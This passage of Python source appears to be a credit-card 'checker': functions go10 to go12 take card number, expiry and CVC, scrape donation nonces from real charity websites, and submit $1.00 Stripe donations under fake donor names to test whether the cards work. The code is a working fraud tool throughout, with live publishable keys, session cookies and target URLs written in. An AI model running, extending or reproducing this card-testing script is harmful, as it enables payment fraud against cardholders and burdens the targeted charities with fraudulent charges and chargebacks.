            'description': 'Help us Cure MS – Donate',
            'ID': f'{donation_nonce}',
            'gateway': 'stripe',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'first_name': 'Gen',
            'last_name': 'Paypal',
            'email': email,
            'address': '27 Allen St',
            'address_2': '',
            'city': 'New York',
            'state': 'New York',
            'postcode': '10002',
            'country': 'US',
            'phone': '4303000850',
            'donor_comment': '',
            'stripe_payment_method': f'{pm}',
            'action': 'make_donation',
            'form_action': 'make_donation',
        }
        
        response = requests.post('https://alexandrasangels.org/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51BarLXCDnz2FU4pGM0PaJaEE5pGdTFWE7CzXqcpU7YxTwPYQ8Eu4Jm6iwlm8eQ8Erc3EXjQKdw6G11YmhXu4CX3l00jdy1iN4S',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}") 
        
#============================================
# --- Main CC Check Function ---
def go10(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        response = requests.get('https://theartsft.com/campaigns/help-us-make-a-difference-right-now/', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G10 ID Response: {form_id}")
        print(f"G10 ID Response: {donation_nonce}")
        print(f"G10 ID Response: {campaign_id}")
        print(f"G10 ID Response: {donation_id}")
        	
        #2
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': user,
        }
        
        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][country]=US&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Ftheartsft.com&time_on_page=44823&client_attribution_metadata[client_session_id]=7d8add04-7cef-4827-a98d-78253689bee5&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51O5jsODxXWlmbYpJcJA6yY3XBycCGCyuPLbzxDiTCm49ZhGlteMhnAmygFVIYR8livzHYuNpP2T0vB5psyagkgvh00ZTtzODqP'
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G10 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
            '__cf_bm': '7iI7.iWjdTMMtIArHGuZOyIjBmbmx2TUy6ngNHGdRhw-1767344735-1.0.1.1-HWd4FDmheP.rFdhAvTHsr5kyKf9GHcd.rpj.tXJVQycvyQaE8jdwZav.kAQs2jx21RPs1AqSWO0_wd91i8uqwjpQ4OyySBjiD8Fyx.52x4c',
            'charitable_session': 'd565ce4949496e29c19daeaa6f751032||86400||82800',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_first_add': 'fd%3D2026-01-02%2009%3A05%3A41%7C%7C%7Cep%3Dhttps%3A%2F%2Ftheartsft.com%2Fcampaigns%2Fhelp-us-make-a-difference-right-now%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
            'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
            'wpcf7_guest_user_id': 'bc738531-4b4a-44b9-b71d-a93f52ccada5',
            'sbjs_current_add': 'fd%3D2026-01-02%2009%3A06%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Ftheartsft.com%2Fcampaigns%2Fhelp-us-make-a-difference-right-now%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
            'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftheartsft.com%2Fcampaigns%2Fhelp-us-make-a-difference-right-now%2F',
            '__stripe_mid': 'e948732a-8f73-4e82-b88c-49159b72d4d5045318',
            '__stripe_sid': '3290d331-bc48-4c45-a647-204d297bfbc7e57c32',
        }
        
        headers = {
            'authority': 'theartsft.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': '__cf_bm=7iI7.iWjdTMMtIArHGuZOyIjBmbmx2TUy6ngNHGdRhw-1767344735-1.0.1.1-HWd4FDmheP.rFdhAvTHsr5kyKf9GHcd.rpj.tXJVQycvyQaE8jdwZav.kAQs2jx21RPs1AqSWO0_wd91i8uqwjpQ4OyySBjiD8Fyx.52x4c; charitable_session=d565ce4949496e29c19daeaa6f751032||86400||82800; sbjs_migrations=1418474375998%3D1; sbjs_first_add=fd%3D2026-01-02%2009%3A05%3A41%7C%7C%7Cep%3Dhttps%3A%2F%2Ftheartsft.com%2Fcampaigns%2Fhelp-us-make-a-difference-right-now%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; wpcf7_guest_user_id=bc738531-4b4a-44b9-b71d-a93f52ccada5; sbjs_current_add=fd%3D2026-01-02%2009%3A06%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Ftheartsft.com%2Fcampaigns%2Fhelp-us-make-a-difference-right-now%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftheartsft.com%2Fcampaigns%2Fhelp-us-make-a-difference-right-now%2F; __stripe_mid=e948732a-8f73-4e82-b88c-49159b72d4d5045318; __stripe_sid=3290d331-bc48-4c45-a647-204d297bfbc7e57c32',
            'origin': 'https://theartsft.com',
            'referer': 'https://theartsft.com/campaigns/help-us-make-a-difference-right-now/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = f'charitable_form_id={form_id}&{form_id}=&_charitable_donation_nonce={donation_nonce}&_wp_http_referer=%2Fcampaigns%2Fhelp-us-make-a-difference-right-now%2F&campaign_id={campaign_id}&description=Your+GIFT+Makes+A+DIFFERENCE!&ID={donation_id}&gateway=stripe&donation_amount=custom&custom_donation_amount=1.00&first_name=Gen&last_name=Paypal&email={email}&address=&address_2=&city=&state=&postcode=&country=US&phone=&stripe_payment_method={pm}&action=make_donation&form_action=make_donation'
        
        response = requests.post('https://theartsft.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51O5jsODxXWlmbYpJcJA6yY3XBycCGCyuPLbzxDiTCm49ZhGlteMhnAmygFVIYR8livzHYuNpP2T0vB5psyagkgvh00ZTtzODqP',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}")
        
#============================================
# --- Main CC Check Function ---
def go11(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        
        response = requests.get('https://www.altaseadsconservancy.org/campaigns/operations/', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G11 ID Response: {form_id}")
        print(f"G11 ID Response: {donation_nonce}")
        print(f"G11 ID Response: {campaign_id}")
        print(f"G11 ID Response: {donation_id}")
        	
        #2
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+card-element&referrer=https%3A%2F%2Fwww.altaseadsconservancy.org&time_on_page=42681&client_attribution_metadata[client_session_id]=1966980c-5181-4fa3-af8f-8f328b45386f&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51MroX6ES7srJGP9YNv9OqzlN4X47yrRIjSMBA4opyz6NtnuoCLwV5hdMcU4zrTbWEdQejUxwdrZyw6iHVP9pEXpa00xkqBfq0N'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G11 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
    '__stripe_mid': 'f6635a5a-4925-4970-8de0-cc40ae98452170c170',
    'nfd-enable-cf-opt': '63a6825d27cab0f204d3b602',
    'charitable_session': 'a2638ff555cd2926bb2cf238bb5dfe84||86400||82800',
    '__stripe_sid': '638ed1f4-d591-473a-9692-1d524e046d433bc034',
        }
        headers = {
    'authority': 'www.altaseadsconservancy.org',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '__stripe_mid=f6635a5a-4925-4970-8de0-cc40ae98452170c170; nfd-enable-cf-opt=63a6825d27cab0f204d3b602; charitable_session=a2638ff555cd2926bb2cf238bb5dfe84||86400||82800; __stripe_sid=638ed1f4-d591-473a-9692-1d524e046d433bc034',
    'origin': 'https://www.altaseadsconservancy.org',
    'pragma': 'no-cache',
    'referer': 'https://www.altaseadsconservancy.org/campaigns/operations/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
        }
        data = {
    'charitable_form_id': f'{form_id}',
    f'{form_id}': '',
    '_charitable_donation_nonce': f'{donation_nonce}',
    '_wp_http_referer': '/campaigns/operations/',
    'campaign_id': f'{campaign_id}',
    'description': 'Operations',
    'ID': f'{donation_id}',
    'custom_donation_amount': '1.00',
    'first_name': 'Tiana',
    'last_name': 'Jakubowski',
    'email': email,
    'gateway': 'stripe',
    'stripe_payment_method': f'{pm}',
    'action': 'make_donation',
    'form_action': 'make_donation',
        }
        response = requests.post(
    'https://www.altaseadsconservancy.org/wp-admin/admin-ajax.php',
    cookies=cookies,
    headers=headers,
    data=data,#, proxies=proxy, timeout=30)    
        )
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51MroX6ES7srJGP9YNv9OqzlN4X47yrRIjSMBA4opyz6NtnuoCLwV5hdMcU4zrTbWEdQejUxwdrZyw6iHVP9pEXpa00xkqBfq0N',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}")
        
#============================================
# --- Main CC Check Function ---
def go12(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        response = requests.get('https://mentoredbynature.com/donate-and-support/', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G12 ID Response: {form_id}")
        print(f"G12 ID Response: {donation_nonce}")
        print(f"G12 ID Response: {campaign_id}")
        print(f"G12 ID Response: {donation_id}")
        	
        #2
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F328730e3ee%3B+stripe-js-v3%2F328730e3ee%3B+card-element&referrer=https%3A%2F%2Fmentoredbynature.com&time_on_page=28013&client_attribution_metadata[client_session_id]=4de09c12-9c5f-4277-8d5e-f7c4c4441fa8&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51RTq9zRsOx2txaML3VgjUAAMHfyv1IUr5doGxJIc6f2dwRfgXEHq6sAdwCLs1IodErvXVOKIrgLuRFnqPxTHyz5V00VniQiMS7'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G12 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
    '__stripe_mid': '7a299d2d-2498-4831-b7f5-089ca187c5596473a0',
    'charitable_session': '82d4396681c212e74278a63c4aed8628||86400||82800',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-12-23%2018%3A59%3A28%7C%7C%7Cep%3Dhttps%3A%2F%2Fmentoredbynature.com%2Fdonate-and-support%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-12-23%2018%3A59%3A28%7C%7C%7Cep%3Dhttps%3A%2F%2Fmentoredbynature.com%2Fdonate-and-support%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmentoredbynature.com%2Fdonate-and-support%2F',
    '__stripe_sid': 'd6fc373d-24e5-4887-9f7f-f5fe0da495ff38ba41',
        }
        headers = {
    'authority': 'mentoredbynature.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '__stripe_mid=7a299d2d-2498-4831-b7f5-089ca187c5596473a0; charitable_session=82d4396681c212e74278a63c4aed8628||86400||82800; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-12-23%2018%3A59%3A28%7C%7C%7Cep%3Dhttps%3A%2F%2Fmentoredbynature.com%2Fdonate-and-support%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-12-23%2018%3A59%3A28%7C%7C%7Cep%3Dhttps%3A%2F%2Fmentoredbynature.com%2Fdonate-and-support%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmentoredbynature.com%2Fdonate-and-support%2F; __stripe_sid=d6fc373d-24e5-4887-9f7f-f5fe0da495ff38ba41',
    'origin': 'https://mentoredbynature.com',
    'pragma': 'no-cache',
    'referer': 'https://mentoredbynature.com/donate-and-support/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
        }
        data = {
    'charitable_form_id': f'{form_id}',
    f'{form_id}': '',
    '_charitable_donation_nonce': f'{donation_nonce}',
    '_wp_http_referer': '/donate-and-support/',
    'campaign_id': f'{campaign_id}',
    'description': 'Support Nature Connection in Aotearoa',
    'ID': f'{donation_id}',
    'gateway': 'stripe',
    'recurring_donation': 'month',
    'donation_amount': 'recurring-custom',
    'custom_recurring_donation_amount': '1.00',
    'custom_donation_amount': '',
    'first_name': 'Tiana',
    'last_name': 'Jakubowski',
    'email': email,
    'anonymous_donation': '1',
    'stripe_payment_method': f'{pm}',
    'action': 'make_donation',
    'form_action': 'make_donation',
        }
        response = requests.post(
    'https://mentoredbynature.com/wp-admin/admin-ajax.php',
    cookies=cookies,
    headers=headers,
    data=data,#, proxies=proxy, timeout=30)    
        )
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
